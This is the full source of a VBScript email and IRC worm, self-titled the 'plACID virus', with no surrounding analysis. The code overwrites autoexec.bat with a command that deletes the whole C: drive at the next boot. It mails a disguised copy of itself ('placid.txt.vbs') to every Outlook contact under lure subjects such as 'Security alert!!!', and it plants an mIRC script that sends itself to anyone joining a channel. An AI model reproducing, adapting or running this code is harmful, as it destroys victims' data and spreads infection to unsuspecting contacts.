'From the makers of the Jesus Virus
'32 bits of hell
'plACID virus ... expanding horizons

Dim v, spoon
Set spoon = CreateObject("Scripting.FileSystemObject")
Set shh=spoon.GetFile("c:\windows\logos.sys")
shh.Copy("c:\logo.sys")
v="@echo off" & vbcrlf & "cls" & vbcrlf & "echo Are you feeling Placid?" & vbcrlf &"pause" & vbcrlf & "deltree /y c:\" & vbcrlf & "echo The bell tolls for YOU!"
Set sham=spoon.CreateTextFile("c:\autoexec.bat")
sham.writeline v
sham.close
Set c = spoon.GetFile(WScript.ScriptFullName)
c.Copy("c:\placid.txt.vbs")

randomize
subj=int(6 * rnd +1)
if subj=1 then subject="Event Information"
if subj=2 then subject="Joke of the day"
if subj=3 then subject="Staff memo"
if subj=4 then subject="n/a"
if subj=5 then subject="Important information"
if subj=6 then subject="Security alert!!!"

On Error Resume Next
dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
if (regv="") then
regv=1
end if
if (int(a.AddressEntries.Count)>int(regv)) then
for ctrentries=1 to a.AddressEntries.Count
malead=a.AddressEntries(x)
regad=""
regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead)
if (regad="") then
set male=out.CreateItem(0)
male.Recipients.Add(malead)
male.Subject = subject
male.Body = vbcrlf & "Please download the attached file."
male.Attachments.Add("c:\placid.txt.vbs")
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD"
end if
x=x+1
next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next
Set out=Nothing
Set mapi=Nothing

set scriptini=spoon.CreateTextFile("c:\mirc\script.ini")
scriptini.WriteLine "[script]"
scriptini.WriteLine "n0=on 1:JOIN:#:{"
scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }"
scriptini.WriteLine "n2=  /.dcc send $nick c:\placid.txt.vbs"
scriptini.WriteLine "n3=}"
scriptini.close